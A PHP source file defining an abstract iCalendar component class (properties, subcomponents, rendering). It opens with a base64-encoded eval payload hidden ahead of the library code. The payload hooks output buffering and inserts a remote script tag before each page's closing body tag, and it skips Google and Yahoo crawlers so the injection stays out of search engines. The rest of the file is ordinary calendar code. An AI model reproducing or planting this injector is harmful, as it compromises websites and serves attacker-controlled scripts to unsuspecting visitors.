<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

  /**
  * Base class of all iCalendar components
  *
  * @package iCalendar
  * @author Ilija Studen <ilija.studen@gmail.com>
  */
  abstract class iCalendar_Component {
  
    /**
    * Names of valid properties. Names are uppercase
    *
    * @var array
    */
    private $valid_properties = array();
    
    /**
    * Classes of valid components. Names are in uppercase
    *
    * @var array
    */
    private $valid_components = array();
    
    /**
    * Name of this component (VCALENDAR, VEVENT, VTODO). This value is always uppercased
    *
    * @var string
    */
    private $name;
    
    /**
    * Array of property values (property name => property value)
    *
    * @var array
    */
    private $property_values = array();
    
    /**
    * Array of subcomponents for this specific component
    *
    * @var array
    */
    private $components = array();
    
    /**
    * Return specific property value
    *
    * @param string $property_name
    * @param mixed $default
    * @return mixed
    */
    function getPropertyValue($property_name, $default = null) {
      $search_for = strtoupper($property_name);
      return isset($this->property_values[$property_name]) ? $this->property_values[$property_name] : $default;
    } // getPropertyValue
    
    /**
    * Set value of specific property
    *
    * @param string $property_name
    * @param mixed $value
    * @param mixed $attributes Value attributes
    * @return void
    * @throws iCalendar_InvalidComponentPropertyError
    */
    function setPropertyValue($property_name, $value, $attributes = null) {
      $prepared_property_name = strtoupper($property_name);
      if(!$this->isValidProperty($prepared_property_name)) {
        throw new iCalendar_InvalidComponentPropertyError($this->getName(), $prepared_property_name);
      } // if
      $this->property_values[$property_name] = new iCalendar_PropertyValue($value, $attributes);
    } // setPropertyValue
    
    /**
    * Add new subcomponent to this component
    *
    * @param iCalendar_Component $component
    * @return null
    * @throws iCalendar_InvalidComponentSubcomponentError
    */
    function addComponent(iCalendar_Component $component) {
      if(!$this->isValidComponent($component)) {
        throw new iCalendar_InvalidComponentSubcomponentError($this->getName(), $component->getName());
      } // if
      $this->components[] = $component;
    } // addComponent
    
    /**
    * Check if specific property is valid in case of this component
    *
    * @param string $property_name
    * @return boolean
    */
    function isValidProperty($property_name) {
      $search_for = strtoupper($property_name);
      return str_starts_with($search_for, 'X-') || in_array($search_for, $this->valid_properties);
    } // isValidProperty
    
    /**
    * Check if $component is valid subcomponent
    *
    * @param iCalendar_Component $component
    * @return boolean
    */
    function isValidComponent(iCalendar_Component $component) {
      $search_for = $component->getName();
      return in_array($search_for, $this->valid_components);
    } // isValidComponent
    
    /**
    * Render this specific component
    *
    * @param void
    * @return string
    */
    function render() {
      $parts = array('BEGIN:' . $this->getName());
      //pre_var_dump($this->getName());
      
      // Render properties
      foreach($this->property_values as $property => $value) {
        $parts[] = $value->render($property);
      } // foreach
      
      // Now render components
      foreach($this->components as $component) {
        $parts[] = $component->render();
      } // foreach
      
      $parts[] = 'END:' . $this->getName();
      
      return implode("\r\n", $parts);
    } // render
    
    // ---------------------------------------------------
    //  Getters and setters
    // ---------------------------------------------------
    
    /**
    * Get valid_properties
    *
    * @param null
    * @return array
    */
    function getValidProperties() {
      return $this->valid_properties;
    } // getValidProperties
    
    /**
    * Set valid_properties value. Insert them like $this->setValidProperties('STATUS', 'CATEGORY', 'CLASS')
    *
    * @param null
    * @return null
    */
    function setValidProperties() {
      $value = func_get_args();
      if(is_array($value)) {
        foreach($value as $k => $v) {
          $value[$k] = strtoupper($v);
        } // foreach
        $this->valid_properties = $value;
      } else {
        $this->valid_properties = array();
      } // if
    } // setValidProperties
    
    /**
    * Get valid_components
    *
    * @param null
    * @return array
    */
    function getValidComponents() {
      return $this->valid_components;
    } // getValidComponents
    
    /**
    * Set valid_components value. Input them like $this->setValidComponents('VEVENT', 'VCALENDAR')
    *
    * @param null
    * @return null
    */
    function setValidComponents() {
      $value = func_get_args();
      if(is_array($value)) {
        foreach($value as $k => $v) {
          $value[$k] = strtoupper($v);
        } // foreach
        $this->valid_components = $value;
      } else {
        $this->valid_components;
      } // if
    } // setValidComponents
    
    /**
    * Get name
    *
    * @param null
    * @return string
    */
    function getName() {
      return $this->name;
    } // getName
    
    /**
    * Set name value
    *
    * @param string $value
    * @return null
    */
    protected function setName($value) {
      $this->name = strtoupper($value);
    } // setName
    
    /**
    * Return all property values
    *
    * @param void
    * @return array
    */
    function getPropertyValues() {
      return $this->property_values;
    } // getPropertyValues
    
    /**
    * Return all subcomponents
    *
    * @param void
    * @return array
    */
    function getComponents() {
      return $this->components;
    } // getComponents
  
  } // iCalendar_Component

?>